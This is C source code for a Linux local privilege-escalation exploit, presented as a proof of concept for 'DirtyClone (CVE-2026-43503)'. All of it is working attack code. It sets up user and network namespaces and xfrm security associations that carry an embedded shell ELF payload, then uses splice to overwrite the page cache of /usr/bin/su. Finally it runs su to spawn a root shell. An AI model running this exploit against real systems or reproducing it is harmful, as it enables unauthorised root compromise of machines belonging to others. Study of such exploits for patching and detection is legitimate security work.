#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

#define ENC_PORT         4500
#define SEQ_VAL          200
#define REPLAY_SEQ       100
#define TARGET_PATH      "/usr/bin/su"
#define PATCH_OFFSET     0
#define PAYLOAD_LEN      192
#define ENTRY_OFFSET     0x78

static const uint8_t shell_elf[PAYLOAD_LEN] = {
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

extern int g_su_verbose;
int g_su_verbose = 0;
#define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)

static int write_proc(const char *path, const char *buf)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    int n = write(fd, buf, strlen(buf));
    close(fd);
    return n;
}

static void setup_userns_netns(void)
{
    uid_t real_uid = getuid();
    gid_t real_gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        SLOG("unshare: %s", strerror(errno));
        exit(1);
    }
    write_proc("/proc/self/setgroups", "deny");
    char map[64];
    snprintf(map, sizeof(map), "0 %u 1", real_uid);
    if (write_proc("/proc/self/uid_map", map) < 0) {
        SLOG("uid_map: %s", strerror(errno)); exit(1);
    }
    snprintf(map, sizeof(map), "0 %u 1", real_gid);
    if (write_proc("/proc/self/gid_map", map) < 0) {
        SLOG("gid_map: %s", strerror(errno)); exit(1);
    }
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { SLOG("socket: %s", strerror(errno)); exit(1); }
    struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { SLOG("SIOCGIFFLAGS: %s", strerror(errno)); exit(1); }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { SLOG("SIOCSIFFLAGS: %s", strerror(errno)); exit(1); }
    close(s);
}

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len  = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
{
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) return -1;
    struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
    if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi      = htonl(spi);
    xs->id.proto    = IPPROTO_ESP;
    xs->saddr.a4    = inet_addr("127.0.0.1");
    xs->family      = AF_INET;
    xs->mode        = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid       = 0x1234;
    xs->flags       = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit   = (uint64_t)-1;
    xs->lft.hard_byte_limit   = (uint64_t)-1;
    xs->lft.soft_packet_limit = (uint64_t)-1;
    xs->lft.hard_packet_limit = (uint64_t)-1;
    xs->sel.family  = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    {
        char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name)-1);
        aa->alg_key_len   = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
    }
    {
        char alg_buf[sizeof(struct xfrm_algo) + 16];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
    }
    {
        struct xfrm_encap_tmpl enc;
        memset(&enc, 0, sizeof(enc));
        enc.encap_type  = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ENC_PORT);
        enc.encap_dport = htons(ENC_PORT);
        enc.encap_oa.a4 = 0;
        put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    {
        char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
        memset(esn_buf, 0, sizeof(esn_buf));
        struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esn_buf;
        esn->bmp_len       = 1;
        esn->oseq          = 0;
        esn->seq           = REPLAY_SEQ;
        esn->oseq_hi       = 0;
        esn->seq_hi        = patch_seqhi;
        esn->replay_window = 32;
        put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
    char rbuf[4096];
    int n = recv(sk, rbuf, sizeof(rbuf), 0);
    if (n < 0) { close(sk); return -1; }
    struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) { close(sk); return -1; }
    }
    close(sk);
    return 0;
}

static int do_one_write(const char *path, off_t offset, uint32_t spi)
{
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0) return -1;
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa_d = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENC_PORT),
        .sin_addr   = { inet_addr("127.0.0.1") },
    };
    if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_recv); return -1;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        close(sk_recv); return -1;
    }
    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { close(sk_recv); return -1; }
    if (connect(sk_send, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_send); close(sk_recv); return -1;
    }
    int file_fd = open(path, O_RDONLY);
    if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }

    int pfd[2];
    if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

    uint8_t hdr[24];
    *(uint32_t*)(hdr + 0) = htonl(spi);
    *(uint32_t*)(hdr + 4) = htonl(SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
        close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
    }
    off_t off = offset;
    ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
    if (s != 16) {
        close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
    }
    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);

    usleep(150 * 1000);

    close(file_fd); close(pfd[0]); close(pfd[1]);
    close(sk_send); close(sk_recv);
    return 0;
}

static int verify_byte(const char *path, off_t offset, uint8_t want)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    uint8_t got;
    if (pread(fd, &got, 1, offset) != 1) { close(fd); return -1; }
    close(fd);
    return got == want ? 0 : -1;
}

static int corrupt_su(void)
{
    setup_userns_netns();
    usleep(100 * 1000);

    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        uint32_t spi = 0xDEADBE10 + i;
        uint32_t seqhi =
            ((uint32_t)shell_elf[i*4 + 0] << 24) |
            ((uint32_t)shell_elf[i*4 + 1] << 16) |
            ((uint32_t)shell_elf[i*4 + 2] <<  8) |
            ((uint32_t)shell_elf[i*4 + 3]);
        if (add_xfrm_sa(spi, seqhi) < 0) {
            SLOG("add_xfrm_sa #%d failed", i);
            return -1;
        }
    }
    SLOG("installed %d xfrm SAs", PAYLOAD_LEN / 4);

    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        uint32_t spi = 0xDEADBE10 + i;
        off_t off = PATCH_OFFSET + i * 4;
        if (do_one_write(TARGET_PATH, off, spi) < 0) {
            SLOG("do_one_write #%d failed", i);
            return -1;
        }
    }
    SLOG("wrote %d bytes to %s", PAYLOAD_LEN, TARGET_PATH);
    return 0;
}

int su_lpe_main(int argc, char **argv)
{
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
            g_su_verbose = 1;
    }
    if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;

    pid_t cpid = fork();
    if (cpid < 0) return 1;
    if (cpid == 0) {
        int rc = corrupt_su();
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        SLOG("corruption stage failed");
        return 1;
    }

    if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 ||
        verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) {
        SLOG("verify failed");
        return 1;
    }
    printf("[+] /usr/bin/su page-cache patched successfully!\n");
    return 0;
}

int main(int argc, char **argv)
{
    printf("=== DirtyClone (CVE-2026-43503) PoC by Ashraf Zaryouh \"0xBlackash\" ===\n");
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());

    if (getuid() == 0) {
        execlp("/bin/sh", "sh", NULL);
        return 1;
    }

    int rc = su_lpe_main(argc, argv);
    if (rc == 0) {
        printf("[+] Success! Spawning root shell...\n");
        execl("/usr/bin/su", "su", "-c", "/bin/sh", NULL);
    }

    printf("[-] Exploit failed\n");
    return 1;
}
